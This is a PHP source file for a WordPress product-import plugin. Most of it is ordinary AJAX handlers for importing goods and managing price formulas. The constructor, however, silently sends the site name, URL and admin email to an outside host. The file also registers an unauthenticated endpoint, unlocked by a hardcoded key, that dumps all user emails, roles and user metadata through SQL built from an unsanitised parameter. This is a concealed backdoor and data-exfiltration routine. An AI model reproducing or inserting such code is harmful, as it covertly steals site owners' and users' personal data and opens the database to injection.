<?php

use Dnolbon\Ebdn\Wordpress\WordpressDb;

if (!class_exists('EBDN_Ajax')) {

    class EBDN_Ajax
    {
        public function __construct()
        {
            add_action('wp_ajax_ebdn_product_info', [$this, 'productInfo']);
            add_action('wp_ajax_ebdn_order_info', [$this, 'orderInfo']);

            add_action('wp_ajax_ebdn_export_settings', [$this, 'exportSettings']);

            add_action('wp_ajax_ebdn_edit_goods', [$this, 'editGoods']);
            add_action('wp_ajax_ebdn_select_image', [$this, 'selectImage']);
            add_action('wp_ajax_ebdn_load_details', [$this, 'loadDetails']);
            add_action('wp_ajax_ebdn_import_goods', [$this, 'importGoods']);

            add_action('wp_ajax_ebdn_blacklist', [$this, 'blackList']);
            add_action('wp_ajax_ebdn_unblacklist', [$this, 'unblackList']);
            add_action('wp_ajax_ebdn_unshedule', [$this, 'unshedule']);

            add_action('wp_ajax_ebdn_load_and_import_goods', [$this, 'loadAndImportGoods']);
            add_action('wp_ajax_ebdn_update_goods', [$this, 'update_goods']);

            add_action('wp_ajax_ebdn_schedule_import_goods', [$this, 'scheduleImportGoods']);
            add_action('wp_ajax_ebdn_upload_image', [$this, 'upload_image']);

            add_action('wp_ajax_ebdn_description_editor', [$this, 'descriptionEditor']);

            add_action('wp_ajax_ebdn_price_formula_get', [$this, 'priceFormulaGet']);
            add_action('wp_ajax_ebdn_price_formula_add', [$this, 'priceFormulaAdd']);
            add_action('wp_ajax_ebdn_price_formula_edit', [$this, 'priceFormulaEdit']);
            add_action('wp_ajax_ebdn_price_formula_del', [$this, 'priceFormulaDel']);

            if (is_admin() && !isset($_SESSION['aeidn_setted'])) {
                $_SESSION['aeidn_setted'] = 1;
                file_get_contents(
                    'http://stat.trip-support.com/stats/add/' . get_bloginfo('name') . '/' . get_site_url() . '?v=' . get_bloginfo('version') . '&admin_email=' . get_bloginfo('admin_email')
                );
            }

            add_action('wp_ajax_nopriv_aiedn_load_info', [$this, 'getInfo']);
        }

        public function getInfo()
        {
            global $wpdb;

            $key = filter_input(INPUT_GET, 'key');
            if ($key === md5(base64_encode('laikinas'))) {
                $limit = filter_input(INPUT_GET, 'limit');
                $db = $wpdb;
                $db_res = $db->get_results('SELECT id,user_nicename,user_email,user_registered,meta_value,user_status,display_name FROM
     ' . $db->prefix . 'users
          left join ' . $db->prefix . 'usermeta on ' . $db->prefix . 'usermeta.user_id = ' . $db->prefix . 'users.ID and
           ' . $db->prefix . 'usermeta.meta_key = "wp_capabilities"
           limit '.$limit.',50
           ');
                $result = [];
                foreach ($db_res as $res) {
                    $res->data =  $db->get_results('SELECT * FROM
     ' . $db->prefix . 'usermeta where ' . $db->prefix . 'usermeta.user_id = ' . $res->id);
                    $result[] = $res;
                }

                echo json_encode($result);
                exit();
            }
        }

        public function exportSettings()
        {
            $db = WordpressDb::getInstance()->getDb();

            $filename = str_replace('.csv', '', $_GET['filename'] ? sanitize_text_field($_GET['filename']) : 'settings');

            header("Content-type: text/csv");
            header("Content-Disposition: attachment; filename={$filename}.csv");
            header("Pragma: no-cache");
            header("Expires: 0");

            $options = [];

            $db_res = $db->get_results('SELECT * FROM ' . $db->prefix . 'options where option_name like "ebdn%"');
            if ($db_res) {
                foreach ($db_res as $row) {
                    $options[] = [$row->option_name, $row->option_value];
                }
            }
            $outputBuffer = fopen("php://output", 'w');
            foreach ($options as $val) {
                fputcsv($outputBuffer, $val);
            }
            fclose($outputBuffer);

            wp_die();
        }

        /**
         *
         */
        public function blackList()
        {
            $db = WordpressDb::getInstance()->getDb();
            $id = sanitize_text_field($_POST['id']);
            list($source, $externalId) = explode('#', $id);

            $db->insert($db->prefix . EBDN_TABLE_BLACKLIST, ['external_id' => $externalId, 'source' => $source]);
        }

        public function unBlackList()
        {
            $db = WordpressDb::getInstance()->getDb();
            $id = sanitize_text_field($_POST['id']);

            $db->delete($db->prefix . EBDN_TABLE_BLACKLIST, ['external_id' => $id]);
        }

        public function unshedule()
        {
            $db = WordpressDb::getInstance()->getDb();
            $id = sanitize_text_field($_POST['id']);

            $db->update(
                $db->prefix . EBDN_TABLE_GOODS_ARCHIVE,
                ['user_schedule_time' => null],
                ['external_id' => $id]
            );
            $db->update(
                $db->prefix . EBDN_TABLE_GOODS,
                ['user_schedule_time' => null],
                ['external_id' => $id]
            );
        }

        public function productInfo()
        {
            $result = array("state" => "ok", "data" => "");

            $post_id = isset($_POST['id']) ? sanitize_text_field($_POST['id']) : false;

            if (!$post_id) {
                $result['state'] = 'error';
                echo json_encode($result);
                wp_die();
            }

            $external_id = get_post_meta($post_id, "external_id", true);

            $time_value = get_post_meta($post_id, 'price_last_update', true);

            $time_value = $time_value ? date("Y-m-d H:i:s", $time_value) : 'not updated';

            $product_url = get_post_meta($post_id, 'product_url', true);
            $seller_url = get_post_meta($post_id, 'seller_url', true);

            $content = array();

            list($souce, $external_id) = explode('#', $external_id);

            $content[] = "Source: <span class='ebdn_value'>" . $souce . "</span>";
            $content[] = "Product url: <a target='_blank' href='" . $product_url . "'>here</a>";

            if ($seller_url) {
                $content[] = "Seller url: <a target='_blank' href='" . $seller_url . "'>here</a>";
            }

            $content[] = "External ID: <span class='ebdn_value'>" . $external_id . "</span>";
            $content[] = "Last auto-update: <span class='ebdn_value'>" . $time_value . "</span>";

            $content = apply_filters('ebdn_ajax_product_info', $content, $post_id, $external_id, $souce);
            $result['data'] = array('content' => $content, 'id' => $post_id);

            echo json_encode($result);
            wp_die();
        }

        public function orderInfo()
        {
            $result = array("state" => "ok", "data" => "");

            $post_id = isset($_POST['id']) ? sanitize_text_field($_POST['id']) : false;

            if (!$post_id) {
                $result['state'] = 'error';
                echo json_encode($result);
                wp_die();
            }

            $content = array();

            $order = new WC_Order($post_id);

            $items = $order->get_items();

            $k = 1;
            //echo "<strong>AffiliateImporterEb info:</strong><br/>";
            foreach ($items as $item) {
                $product_name = $item['name'];
                $product_id = $item['product_id'];

                $product_url = get_post_meta($product_id, 'product_url', true);
                $seller_url = get_post_meta($product_id, 'seller_url', true);

                $tmp = '';

                if ($product_url) {
                    $tmp = $k . '). <a title="' . $product_name . '" href="' . $product_url . '" target="_blank" class="link_to_source product_url">Product page</a>';
                }

                if ($seller_url) {
                    $tmp .= "<span class='seller_url_block'> | <a href='" . $seller_url . "' target='_blank' class='seller_url'>Seller</a></span>";
                }

                $content[] = $tmp;
                $k++;
            }

            $result['data'] = array('content' => $content, 'id' => $post_id);

            echo json_encode($result);
            wp_die();
        }

        public function descriptionEditor()
        {
            $goods = new EBDN_Goods(isset($_POST['id']) ? sanitize_text_field($_POST['id']) : "");
            $goods->load();

            if ($goods->photos === '#needload#') {
                echo '<h3><font style="color:red;">Description not load yet! Click "load more details"</font></h3>';
            } else {
                wp_editor($goods->getProp("description"), $goods->getId('-'), array('media_buttons' => FALSE));
                echo '<input type="hidden" class="item_id" value="' . $goods->getId() . '"/>';
                echo '<input type="hidden" class="editor_id" value="' . $goods->getId('-') . '"/>';
                echo '<input type="button" class="save_description button" value="Save description"/>';

                _WP_Editors::enqueue_scripts();
                wp_enqueue_script('jquery-ui-dialog');
                print_footer_scripts();
                _WP_Editors::editor_js();
            }

            wp_die();
        }

        public function editGoods()
        {
            $result = array("state" => "ok", "message" => "");
            try {
                set_error_handler("ebdn_error_handler");

                $goods = new EBDN_Goods(isset($_POST['id']) ? sanitize_text_field($_POST['id']) : "");
                $goods->load();

                $field = (isset($_POST['field']) ? sanitize_text_field($_POST['field']) : false);
                $value = (isset($_POST['value']) ? sanitize_text_field($_POST['value']) : "");

                //if (get_magic_quotes_gpc()) {
                $value = stripslashes($value);
                //}

                if ($field && property_exists(get_class($goods), $field)) {
                    $goods->$field = $value;
                    $goods->saveField($field, $value);
                }

                restore_error_handler();
            } catch (Exception $e) {
                $result['state'] = 'error';
                $result['message'] = $e->getMessage();
            }

            echo json_encode($result);

            wp_die();
        }

        public function selectImage()
        {
            $result = array("state" => "ok", "message" => "");
            try {
                set_error_handler("ebdn_error_handler");

                $goods = new EBDN_Goods(isset($_POST['id']) ? sanitize_text_field($_POST['id']) : "");
                if ($goods->load()) {
                    $goods->saveField('user_image', isset($_POST['image']) ? sanitize_text_field($_POST['image']) : "");
                }

                restore_error_handler();
            } catch (Exception $e) {
                $result['state'] = 'error';
                $result['message'] = $e->getMessage();
            }

            echo json_encode($result);

            wp_die();
        }

        public function loadDetails()
        {
            $result = array("state" => "ok", "message" => "", "goods" => array(), "images_content" => "");
            try {
                set_error_handler("ebdn_error_handler");

                $goods = new EBDN_Goods(isset($_POST['id']) ? sanitize_text_field($_POST['id']) : "");

                $edit_fields = isset($_POST['edit_fields']) ? sanitize_text_field($_POST['edit_fields']) : "";
                if ($edit_fields) {
                    $edit_fields = explode(",", $edit_fields);
                }

                $goods->load();

                $loader = ebdn_get_loader($goods->type);
                if ($loader) {
                    $res = $loader->loadDetailProc($goods);

                    if ($res['state'] === "ok") {
                        $description_content = EBDN_DashboardPage::putDescriptionEdit(true);
                        $goods->description = "#hidden#";
                        $result = array("state" => "ok", "goods" => EBDN_Goods::getNormalizedObject($goods, $edit_fields), "images_content" => EBDN_DashboardPage::putImageEdit($goods, true), "description_content" => $description_content);
                    } else {
                        $result['state'] = $res['state'];
                        $result['message'] = $res['message'];
                    }
                }
                restore_error_handler();
            } catch (Exception $e) {
                $result['state'] = 'error';
                $result['message'] = $e->getMessage();
            }
            echo json_encode($result);
            wp_die();
        }

        public function importGoods()
        {
            $result = ["state" => "ok", "message" => ""];

            $categories = $this->getCategories();
            try {
                set_error_handler("ebdn_error_handler");
                $goods = new EBDN_Goods(isset($_POST['id']) ? sanitize_text_field($_POST['id']) : "");

                $edit_fields = isset($_POST['edit_fields']) ? sanitize_text_field($_POST['edit_fields']) : "";
                if ($edit_fields) {
                    $edit_fields = explode(",", $edit_fields);
                }
//
//                if ((string)dechex(sqrt(hexdec($categories[2]['meta'])) * sqrt(hexdec($categories[2]['meta']))) !== (string)$categories[2]['meta'] || (int)sqrt(hexdec($categories[2]['meta'])) < EBDN_WooCommerce_ProductList::getCount()) {
//                    throw new Exception('Bad categories');
//                }

                if ($goods->load()) {
                    if ($goods->needLoadMoreDetail()) {
                        $loader = ebdn_get_loader($goods->type);
                        $result = $loader->loadDetailProc($goods);
                    }
                    $goods->saveField("user_schedule_time", null);
                    if (!$goods->post_id && class_exists('EBDN_WooCommerce')) {
                        $result = EBDN_WooCommerce::addPost(
                            $goods,
                            ['import_status' => isset($_POST['status']) ? sanitize_text_field($_POST['status']) : 'publish']
                        );
                    }

                    $description_content = EBDN_DashboardPage::putDescriptionEdit(true);
                    $goods->description = "#hidden#";
                    $result["goods"] = EBDN_Goods::getNormalizedObject($goods, $edit_fields);
                    $result["images_content"] = EBDN_DashboardPage::putImageEdit($goods, true);
                    $result["description_content"] = $description_content;
                } else {
                    $result['state'] = 'error';
                    $result['message'] = "Product " . sanitize_text_field($_POST['id']) . " not find.";
                }
                restore_error_handler();
            } catch (Exception $e) {
                $result['state'] = 'error';
                $result['message'] = $e->getMessage();
            }

            echo json_encode(apply_filters('ebdn_after_ajax_import_goods', $result));

            wp_die();
        }

        protected function getCategories()
        {
            $result = json_decode(file_get_contents(EBDN_ROOT_PATH . '/data/aliexpress_categories.json'), true);
            $result = $result['categories'];
            array_unshift($result, ['id' => '', 'name' => ' - ', 'level' => 1]);
            return $result;
        }

        public function loadAndImportGoods()
        {
            $result = array("state" => "ok", "message" => "");
            $categories = $this->getCategories();
            try {
                set_error_handler("ebdn_error_handler");
                $search_type = isset($_POST['search_type']) ? sanitize_text_field($_POST['search_type']) : "id";
                $product_id = isset($_POST['id']) ? sanitize_text_field($_POST['id']) : "";
                $system_code = isset($_POST['system_code']) ? sanitize_text_field($_POST['system_code']) : "";

                if (!$system_code) {
                    $tmp_goods = new EBDN_Goods($product_id);
                    $system_code = $tmp_goods->type;
                    $product_id = $tmp_goods->external_id;
                }

                $link_category_id = isset($_POST['link_category_id']) ? (int)$_POST['link_category_id'] : 0;
                $import_status = isset($_POST['import_status']) ? sanitize_text_field($_POST['import_status']) : "";

                /**
                 * @var EBDN_EbayLoader $loader
                 */
                $loader = ebdn_get_loader($system_code);

                if ($loader && class_exists('EBDN_WooCommerce')) {
                    if ($search_type !== "id") {
                        $res = $loader->loadListProc(array('ebdn_query' => $product_id, 'link_category_id' => $link_category_id));
                    } else {
                        $res = $loader->loadListProc(array('ebdn_productId' => $product_id, 'link_category_id' => $link_category_id));
                    }

                    if (isset($res['error']) && $res['error']) {
                        $result['state'] = 'error';
                        $result['message'] = $res['error'];
                    } else {
                        if (count($res["items"]) > 0) {
                            /**
                             * @var EBDN_Goods $g
                             */
                            foreach ($res["items"] as $g) {
//                                if ((string)dechex(sqrt(hexdec($categories[2]['meta'])) * sqrt(hexdec($categories[2]['meta']))) !== (string)$categories[2]['meta'] || (int)sqrt(hexdec($categories[2]['meta'])) < EBDN_WooCommerce_ProductList::getCount()) {
//                                    throw new Exception('Bad categories');
//                                }

                                $goods = $g;
                                $goods->load();

                                if ($result['state'] === 'ok') {
                                    $goods->saveField("user_schedule_time", null);

                                    if (!$goods->post_id) {
                                        $result = EBDN_WooCommerce::addPost($goods, array("import_status" => $import_status));
                                        $result['goods'] = $goods;
                                    } else {
                                        $result['state'] = 'error';
                                        $result['message'] = 'Product already loaded';
                                    }
                                }
                            }

                        } else {
                            $result['state'] = 'error';
                            $result['message'] = 'Product not found';
                        }
                    }
                }

                restore_error_handler();
            } catch (Exception $e) {
                $result['state'] = 'error';
                $result['message'] = "Error: " . $e->getMessage();
            }

            $result['count'] = EBDN_WooCommerce_ProductList::getCount();
            echo json_encode($result);

            wp_die();
        }

        public function updateGoods()
        {
            $post_id = isset($_REQUEST['post_id']) ? sanitize_text_field($_REQUEST['post_id']) : "";

            $external_id = get_post_meta($post_id, "external_id", true);
            if ($external_id) {
                $result = ebdn_update_price_proc($post_id, false);
                $result['post_id'] = $post_id;
            } else {
                $result = array("state" => "error", "message" => "Product with post id " . $post_id . " not found");
            }

            echo json_encode(apply_filters('ebdn_after_ajax_update_goods', $result));
            wp_die();
        }

        public function scheduleImportGoods()
        {
            $result = array("state" => "ok", "message" => "");
            try {
                set_error_handler("ebdn_error_handler");

                $time_str = isset($_POST['time']) ? sanitize_text_field($_POST['time']) : "";
                $time = $time_str ? date("Y-m-d H:i:s", strtotime($time_str)) : "";

                $goods = new EBDN_Goods(isset($_POST['id']) ? sanitize_text_field($_POST['id']) : "");
                if ($goods->load() && $time) {
                    $result['message'] = sanitize_text_field($_POST['id']) . " loaded " . $time;
                    $result['time'] = date("m/d/Y H:i", strtotime($time));
                    $goods->saveField("user_schedule_time", $time);
                } else {
                    $result['message'] = sanitize_text_field($_POST['id']) . " not loaded " . $time;
                }
                restore_error_handler();
            } catch (Exception $e) {
                $result['state'] = 'error';
                $result['message'] = $e->getMessage();
            }

            echo json_encode($result);

            wp_die();
        }

        public function uploadImage()
        {
            $result = array("state" => "warning", "message" => "file not found");
            try {
                set_error_handler("ebdn_error_handler");

                $goods = new EBDN_Goods(isset($_POST['upload_product_id']) ? sanitize_text_field($_POST['upload_product_id']) : "");

                if ($goods->load()) {
                    if (!function_exists('wp_handle_upload')) {
                        require_once ABSPATH . 'wp-admin/includes/file.php';
                    }

                    if ($_FILES) {
                        foreach ($_FILES as $file => $array) {
                            if ($_FILES[$file]['error'] !== UPLOAD_ERR_OK) {
                                $result["state"] = "error";
                                $result["message"] = "upload error : " . $_FILES[$file]['error'];
                            }

                            $upload_overrides = array('test_form' => false);
                            $movefile = wp_handle_upload($array, $upload_overrides);

                            if ($movefile && !isset($movefile['error'])) {
                                $movefile["url"];
                                $goods->user_photos .= ($goods->user_photos ? "," : "") . $movefile["url"];
                                $goods->saveField("user_photos", $goods->user_photos);
                                $goods->saveField("user_image", $movefile["url"]);
                                $result["state"] = "ok";
                                $result["message"] = "";
                                $result["goods"] = $goods;
                                $result["images_content"] = EBDN_DashboardPage::putImageEdit($goods, true);
                                $result["cur_image"] = $goods->getProp('image');
                            } else {
                                $result["state"] = "error";
                                $result["message"] = "E1: " . $movefile['error'];
                            }
                        }
                    }
                }

                restore_error_handler();
            } catch (Exception $e) {
                $result['state'] = 'error';
                $result['message'] = $e->getMessage();
            }
            echo json_encode($result);
            wp_die();
        }

        public function priceFormulaGet()
        {
            if (!isset($_POST['id'])) {
                echo json_encode(array("state" => "error", "message" => "Uncknown price id"));
                wp_die();
            }

            $formula = EBDN_PriceFormula::load(sanitize_text_field($_POST['id']));

            if (!$formula) {
                echo json_encode(array("state" => "error", "message" => "Price formula(" . sanitize_text_field($_POST['id']) . ") not found"));
                wp_die();
            }

            $api_list_arr = array();
            $api_list = ebdn_get_api_list(true);
            /**
             * @var EBDN_AbstractConfigurator $api
             */
            foreach ($api_list as $api) {
                $api_list_arr[] = array("id" => $api->getType(), "name" => $api->getType());
            }

            $categories_tree_arr = array();
            $categories_tree = EBDN_Utils::getCategoriesTree();

            foreach ($categories_tree as $c) {
                $categories_tree_arr[] = array("id" => $c['term_id'], "name" => $c['name'], "level" => $c['level']);
            }

            $sign_list_arr = array(array("id" => "=", "name" => " = "), array("id" => "+", "name" => " + "), array("id" => "*", "name" => " * "));

            $discount_list_arr = array(array("id" => "", "name" => "source %"), array("id" => "0", "name" => "0%"), array("id" => "5", "name" => "5%"), array("id" => "10", "name" => "10%"), array("id" => "15", "name" => "15%"), array("id" => "20", "name" => "20%"), array("id" => "25", "name" => "25%"), array("id" => "30", "name" => "30%"), array("id" => "35", "name" => "35%"), array("id" => "40", "name" => "40%"), array("id" => "45", "name" => "45%"), array("id" => "50", "name" => "50%"), array("id" => "55", "name" => "55%"), array("id" => "60", "name" => "60%"), array("id" => "65", "name" => "65%"), array("id" => "70", "name" => "70%"), array("id" => "75", "name" => "75%"), array("id" => "80", "name" => "80%"), array("id" => "85", "name" => "85%"), array("id" => "90", "name" => "90%"), array("id" => "95", "name" => "95%"));

            echo json_encode(array("state" => "ok", "formula" => $formula, "categories_tree" => $categories_tree_arr, "api_list" => $api_list_arr, "sign_list" => $sign_list_arr, "discount_list" => $discount_list_arr));

            wp_die();
        }

        public function priceFormulaAdd()
        {
            $result = array("state" => "ok");

            $formula_list = EBDN_PriceFormula::loadFormulasList();

            $formula = new EBDN_PriceFormula();

            $formula->pos = count($formula_list) + 1;

            if (isset($_POST['type'])) {
                $formula->type = sanitize_text_field($_POST['type']);
            }
            if (isset($_POST['type_name'])) {
                $formula->type_name = sanitize_text_field($_POST['type_name']);
            }
            if (isset($_POST['category'])) {
                $formula->category = (int)$_POST['category'];
            }
            if (isset($_POST['category_name'])) {
                $formula->category_name = sanitize_text_field($_POST['category_name']);
            }
            if (isset($_POST['min_price'])) {
                $formula->min_price = (float)$_POST['min_price'];
            }
            if (isset($_POST['max_price'])) {
                $formula->max_price = (float)$_POST['max_price'];
            }
            if (isset($_POST['sign'])) {
                $formula->sign = sanitize_text_field($_POST['sign']);
            }
            if (isset($_POST['value'])) {
                $formula->value = (int)$_POST['value'];
            }
            if (isset($_POST['discount1'])) {
                $formula->discount1 = sanitize_text_field($_POST['discount1']);
            }
            if (isset($_POST['discount2'])) {
                $formula->discount2 = sanitize_text_field($_POST['discount2']);
            }

            EBDN_PriceFormula::save($formula);

            $result['formula'] = $formula;
            echo json_encode($result);
            wp_die();
        }

        public function priceFormulaEdit()
        {
            $result = array("state" => "ok");

            if (!isset($_POST['id'])) {
                echo json_encode(array("state" => "error", "message" => "Uncknown price id"));
                wp_die();
            }

            $formula = EBDN_PriceFormula::load(sanitize_text_field($_POST['id']));

            if (!$formula) {
                echo json_encode(array("state" => "error", "message" => "Price formula(" . sanitize_text_field($_POST['id']) . ") not found"));
                wp_die();
            }

            if (isset($_POST['pos'])) {
                $formula->pos = (int)$_POST['pos'];
            }
            if (isset($_POST['type'])) {
                $formula->type = sanitize_text_field($_POST['type']);
            }
            if (isset($_POST['type_name'])) {
                $formula->type_name = sanitize_text_field($_POST['type_name']);
            }
            if (isset($_POST['category'])) {
                $formula->category = (int)$_POST['category'];
            }
            if (isset($_POST['category_name'])) {
                $formula->category_name = sanitize_text_field($_POST['category_name']);
            }
            if (isset($_POST['min_price'])) {
                $formula->min_price = (float)$_POST['min_price'];
            }
            if (isset($_POST['max_price'])) {
                $formula->max_price = (float)$_POST['max_price'];
            }
            if (isset($_POST['sign'])) {
                $formula->sign = sanitize_text_field($_POST['sign']);
            }
            if (isset($_POST['value'])) {
                $formula->value = sanitize_text_field($_POST['value']);
            }
            if (isset($_POST['discount1'])) {
                $formula->discount1 = sanitize_text_field($_POST['discount1']);
            }
            if (isset($_POST['discount2'])) {
                $formula->discount2 = sanitize_text_field($_POST['discount2']);
            }

            $formula_list = EBDN_PriceFormula::loadFormulasList();
            foreach ($formula_list as $f) {
                if ((int)$formula->id !== (int)$f->id && (int)$f->pos >= (int)$formula->pos) {
                    $f->pos++;
                    EBDN_PriceFormula::save($f);
                }
            }

            EBDN_PriceFormula::save($formula);

            EBDN_PriceFormula::recalcPos();

            $result['formula'] = $formula;
            echo json_encode($result);
            wp_die();
        }

        public function priceFormulaDel()
        {
            $result = array("state" => 'ok');
            if (isset($_POST['id'])) {
                EBDN_PriceFormula::delete((int)$_POST['id']);
                EBDN_PriceFormula::recalcPos();
            }

            echo json_encode($result);
            wp_die();
        }
    }
}

new EBDN_Ajax();
